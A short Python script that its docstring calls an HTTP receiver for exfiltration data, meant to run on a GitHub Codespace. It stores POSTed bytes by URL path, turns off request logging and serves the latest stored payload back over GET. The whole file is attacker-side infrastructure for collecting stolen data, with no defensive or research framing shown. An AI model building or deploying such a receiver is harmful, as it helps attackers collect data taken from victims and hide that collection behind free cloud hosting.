#!/usr/bin/env python3
"""
Simple HTTP receiver for exfiltration data
Runs on GitHub Codespace port 8080
"""
import json
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

received_data = {}
data_lock = threading.Lock()

class ExfilHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length)
        path = self.path.strip('/')
        
        with data_lock:
            if path not in received_data:
                received_data[path] = []
            received_data[path].append(data)
            print(f'[RECEIVED] {path}: {len(data)} bytes')
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(b'OK')
    
    def do_GET(self):
        path = self.path.strip('/')
        with data_lock:
            if path in received_data and received_data[path]:
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(received_data[path][-1])
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'NOT_FOUND')
    
    def log_message(self, *args):
        pass

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    server = HTTPServer(('0.0.0.0', port), ExfilHandler)
    print(f'[CODESPACE] HTTP Receiver started on port {port}')
    server.serve_forever()
